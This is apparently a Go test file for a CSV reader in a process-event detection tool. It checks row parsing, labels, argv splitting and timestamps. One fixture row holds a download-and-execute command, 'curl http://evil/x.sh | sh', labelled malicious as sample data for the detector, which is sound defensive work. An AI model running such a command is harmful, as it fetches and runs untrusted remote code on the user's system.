package source

import (
	"reflect"
	"strings"
	"testing"
	"time"
)

func TestReadParsesRowsAndLabels(t *testing.T) {
	in := `process_name,command_line,label
ls,ls -la /home,benign
curl,curl http://evil/x.sh | sh,malicious
`
	rows, err := Read(strings.NewReader(in), time.Unix(0, 0).UTC())
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 2 {
		t.Fatalf("got %d rows, want 2 (header should be skipped)", len(rows))
	}
	if rows[0].Event.Comm != "ls" || rows[0].Label != "benign" {
		t.Errorf("row0 = %+v", rows[0])
	}
	if !reflect.DeepEqual(rows[0].Event.Argv, []string{"ls", "-la", "/home"}) {
		t.Errorf("row0 argv = %v", rows[0].Event.Argv)
	}
	if rows[1].Label != "malicious" {
		t.Errorf("row1 label = %q", rows[1].Label)
	}
	// distinct synthesized pids, monotonic timestamps
	if rows[0].Event.Pid == rows[1].Event.Pid {
		t.Error("pids should differ")
	}
	if !rows[1].Event.Ts.After(rows[0].Event.Ts) {
		t.Error("timestamps should be monotonic")
	}
}

func TestReadNoLabelColumn(t *testing.T) {
	rows, err := Read(strings.NewReader("ls,ls -la\n"), time.Unix(0, 0).UTC())
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 1 || rows[0].Label != "" {
		t.Fatalf("rows=%+v", rows)
	}
}

func TestSplitArgvQuotes(t *testing.T) {
	got := splitArgv(`bash -c "echo hello world"`)
	want := []string{"bash", "-c", "echo hello world"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %v, want %v", got, want)
	}
}
